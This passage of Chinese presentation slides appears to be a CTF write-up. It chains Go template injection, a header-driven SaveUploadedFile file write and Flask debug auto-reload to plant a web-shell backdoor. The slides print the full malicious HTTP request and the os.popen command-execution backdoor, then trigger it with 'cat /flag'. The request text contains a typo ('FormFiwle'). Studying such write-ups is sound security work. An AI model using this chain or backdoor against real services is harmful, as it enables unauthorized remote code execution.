from flask import Flask,request
app = Flask(__name__)


@app.route('/')
def index():
    name = request.args['name']
    return name + " no ssti"


if __name__== "__main__":
    app.run(host="127.0.0.1",port=5000,debug=True)
```

可以看到 Flask 应用非常简单，唯一需要关注的是 `debug=True` 参数，这会导致 Flask 应用在开发模式下运行，从而产生两种攻击面：

- 可以 LFI 原语构造 Debug Pin 从而在 Werkzeug Debugger 中执行任意代码
- 可以通过覆写 Flask Server 监听的文件触发其自动重载，从而实现我们写入的任意 Python 代码执行

---
layout: two-cols
---

## Werkzeug Debugger 是错的

在发现 Flask Debug 模式开启后，经典的攻击思路是：

1. 利用 SSRF 访问内部 Flask。
2. 利用 LFI 泄露信息计算 Debugger PIN。
3. 通过 Debugger Console 执行任意代码。

Go 应用的 SSRF 仅支持 `GET` 请求 (`http.Get`)，而 Werkzeug Debugger 执行代码强制要求 `POST` 请求。

::right::

<div class="w-full flex items-center justify-center">

```mermaid
graph TD
    User((Attacker)) 
    User -->|GET /flask| Go[Go Gin App]
    Go -->|http.Get| Flask[Flask Service]
    Flask -.->|POST Required| Debugger[[Werkzeug Debugger]]
    
    linkStyle 2 stroke:#ef4444,stroke-width:2px,stroke-dasharray: 5 5;
    
    style Go fill:#e0f2fe,stroke:#0284c7
    style Flask fill:#ffedd5,stroke:#f97316
    style Debugger fill:#fee2e2,stroke:#ef4444,color:#b91c1c
```

</div>

---

## 构造无引号文件写入

但是我们仍然可以通过 Flask Debug 模式的第二个特性：「文件修改后自动重载」来实现 RCE。

- 调用 `c.SaveUploadedFile(file *multipart.FileHeader, dst string)`，其中：
  - `file`: 通过 `c.FormFile()` 获取
  - `dst`: 文件保存的目标路径

<div class="my-4 bg-orange-50 dark:bg-orange-900/10 border-l-4 border-orange-500 p-4 rounded text-sm font-mono break-all shadow-md">
  &lcub;&lcub; c.SaveUploadedFile(<span class="border-orange-500 border rounded px-1">c.FormFile(c.Request.Header.Accept.0)</span>, <span class="border-orange-500 border rounded px-1">c.Request.Header.Referer.0</span>) &rcub;&rcub;
</div>

<div class="text-xs text-gray-500 mb-2">
*注: <code>Accept</code> 和 <code>Referer</code> 是 HTTP Header，它们的值是<code>[]string</code>，因此需要使用索引 <code>.0</code> 来获取第一个元素。
</div>

<div class="text-sm">

| 参数 | 需要的值（类型） | 如何提供 | HTTP Header 示例 |
|---|---|---|---|
| `c.FormFile()` 的 name | 字符串 | 从 `Accept` 请求头获取 | `Accept: payload_file` |
| `SaveUploadedFile()` 的 dst | 字符串 | 从 `Referer` 请求头获取 | `Referer: /app/server.py` |

</div>
这样，我们就能精确控制文件写入的内容和位置，同时完美绕过了 `html.EscapeString` 的限制。

---

## 缝合在一起…

这里其实有个 HTTP 的 Caveat：GET 请求是可以携带 Body 的，只不过这不是特别标准的行为，但是幸运地 Gin 会解析。（RFC 2616 允许、RFC 7231 无语义定义、RFC 9110 "SHOULD NOT"）

  ```http {all}{lines:true}
  GET /admin?name={{c.SaveUploadedFile(c.FormFiwle(c.Request.UserAgent()),c.Request.UserAgent())}} HTTP/1.1
  Host: 123.56.244.196:17997
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
  User-Agent: /app/server.py
  Cookie: session-name=...
  Connection: close

  ------WebKitFormBoundary...
  Content-Disposition: form-data; name="/app/server.py"; filename="server.py"
  Content-Type: text/plain

  from flask import Flask, request
  import os
  app = Flask(__name__)
  @app.route('/shell')
    def shell():
    cmd = request.args.get('cmd')   if cmd:       return os.popen(cmd).read()   else:       return 'shell'
  if __name__== "__main__":
    app.run(host="127.0.0.1",port=5000,debug=True)
  ------WebKitFormBoundary...--
  ```

---

## 完整攻击链

<div class="grid grid-cols-4 gap-4 mt-10">
  <!-- Step 1 -->
  <div class="border border-gray-200 dark:border-gray-700 rounded-lg p-2 m-2 bg-white dark:bg-gray-800 shadow-sm relative flex flex-col items-center">
    <div class="flex justify-center mb-4 text-blue-600 dark:text-blue-400">
      <div class="i-carbon-http text-4xl" />
    </div>
    <div class="font-bold text-center mb-2">构造恶意请求</div>
    <ul class="text-xs text-gray-600 dark:text-gray-400 space-y-1 list-disc pl-3 w-full text-left">
      <li><b>Cookie:</b> 伪造的管理员会话</li>
      <li><b>URL:</b> <code>GET /admin?name=&lcub;&lcub;...&rcub;&rcub;</code></li>
      <li><b>Headers:</b> <br/><code><b>Accept:</b> payload_file</code><br/><code><b>Referer:</b> /app/server.py</code></li>
      <li><b>Body:</b> <code>multipart/form-data</code> with malicious Flask code</li>
    </ul>
    <!-- Arrow -->
    <div class="absolute -right-8 top-1/2 -translate-y-1/2 text-gray-300 dark:text-gray-600 z-10">
      <div class="i-carbon-arrow-right text-3xl" />
    </div>
  </div>
  <!-- Step 2 -->
  <div class="border border-gray-200 dark:border-gray-700 rounded-lg p-2 m-2 bg-white dark:bg-gray-800 shadow-sm relative flex flex-col items-center">
    <div class="flex justify-center mb-4 text-orange-600 dark:text-orange-400">
      <div class="i-carbon-document-import text-4xl" />
    </div>
    <div class="font-bold text-center mb-2">触发文件覆盖</div>
    <div class="text-xs text-gray-600 dark:text-gray-400 text-center">
      Go 应用执行模板，<br/><code class="text-red-500 font-bold">SaveUploadedFile</code> 被调用，恶意的 <code class="text-orange-500 font-bold">server.py</code> 覆盖原始文件。
    </div>
    <!-- Arrow -->
    <div class="absolute -right-8 top-1/2 -translate-y-1/2 text-gray-300 dark:text-gray-600 z-10">
      <div class="i-carbon-arrow-right text-3xl" />
    </div>
  </div>
  <!-- Step 3 -->
  <div class="border border-gray-200 dark:border-gray-700 rounded-lg p-2 m-2 bg-white dark:bg-gray-800 shadow-sm relative flex flex-col items-center">
    <div class="flex justify-center mb-4 text-purple-600 dark:text-purple-400">
      <div class="i-carbon-restart text-4xl" />
    </div>
    <div class="font-bold text-center mb-2">Flask 自动重载</div>
    <div class="text-xs text-gray-600 dark:text-gray-400 text-center">
      Debug 模式监测到文件变更，自动重载服务，后门代码生效。
    </div>
    <!-- Arrow -->
    <div class="absolute -right-8 top-1/2 -translate-y-1/2 text-gray-300 dark:text-gray-600 z-10">
      <div class="i-carbon-arrow-right text-3xl" />
    </div>
  </div>
  <!-- Step 4 -->
  <div class="border border-gray-200 dark:border-gray-700 rounded-lg p-2 m-2 bg-white dark:bg-gray-800 shadow-sm flex flex-col items-center">
    <div class="flex justify-center mb-4 text-green-600 dark:text-green-400">
      <div class="i-carbon-terminal text-4xl" />
    </div>
    <div class="font-bold text-center mb-2">通过 SSRF 执行命令</div>
    <div class="text-xs text-gray-600 dark:text-gray-400 text-center">
      再次访问 <code class="bg-gray-100 dark:bg-gray-700 px-1 rounded">/flask</code> 路由，触发后门：<br/>
      <div class="mt-2 bg-gray-100 dark:bg-gray-700 p-1 rounded font-mono text-[10px] break-all">
        GET /flask?name=/shell?cmd=cat /flag
      </div>
      成功获取 Flag。
    </div>
  </div>
</div>
